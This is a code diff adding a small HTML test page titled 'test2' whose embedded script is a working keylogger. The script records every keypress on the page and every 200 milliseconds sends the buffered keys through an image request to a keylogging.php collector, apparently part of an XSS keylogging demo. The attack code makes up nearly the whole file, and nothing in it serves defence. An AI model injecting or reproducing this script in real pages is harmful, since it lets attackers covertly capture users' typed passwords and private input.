@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>test2</title>
+</head>
+<body>
+<table border=1><tr><td>
+Key<input type=text>
+<input type=submit value="Send">
+</td></tr></table>
+<script>
+	var buffer = "";
+	
+	var klog = 'http://localhost:8081/XSS_keyboard/src/keylogging.php?k='
+	document.onkeypress = function(e) {
+		buffer = e.key;
+ 		buffer = " --> " + buffer + "\n";
+	}
+
+	window.setInterval(function() {
+    	if (buffer.length > 0) {
+        	var data = encodeURIComponent(buffer);
+        	new Image().src = klog + data;
+        	buffer = "";
+    		}
+    	}, 200);
+</script>
+</body>
+</html>
+
